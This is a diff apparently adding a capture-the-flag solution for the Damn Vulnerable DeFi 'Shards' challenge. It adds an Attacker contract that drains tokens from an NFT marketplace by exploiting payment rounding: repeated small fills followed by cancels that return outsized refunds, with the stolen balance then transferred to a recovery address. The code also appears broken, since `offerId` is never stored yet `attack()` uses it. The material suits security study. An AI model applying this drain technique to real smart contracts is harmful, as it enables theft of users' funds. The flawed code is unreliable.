@@ -12,6 +12,42 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+contract Attacker {
+    IShardsNFTMarketplace immutable marketplace;
+    DamnValuableToken immutable token;
+    address immutable recovery;
+
+    constructor(
+        IShardsNFTMarketplace _marketplace,
+        DamnValuableToken _token,
+        uint64 offerId,
+        address _recovery
+    ) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external{
+        // Approve max DVT spending (even with 0 balance)
+        token.approve(address(marketplace), type(uint256).max);
+
+        // 1. Tiny fill with payment = 0 (want < 133)
+        marketplace.fill(offerId, 100);
+        // 2. Immediately cancel to get a dust refund
+        marketplace.cancel(offerId, 0); // first purchase at index 0
+
+        // 3. Use the dust to fill a larger amount (payment ~7.5e12 DVT)
+        marketplace.fill(offerId, 1e15);
+        // 4. Cancel the second purchase for a massive refund (~75 DVT)
+        marketplace.cancel(offerId, 1); // second purchase at index 1
+
+        // 5. Send all drained tokens to the recovery address
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(recovery, balance);
+    }
+}
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +150,8 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+      Attacker attacker = new Attacker(ShardsNFTMarketplace(marketplace), token, 1, recovery);
+      attacker.attack();
     }
 
     /**
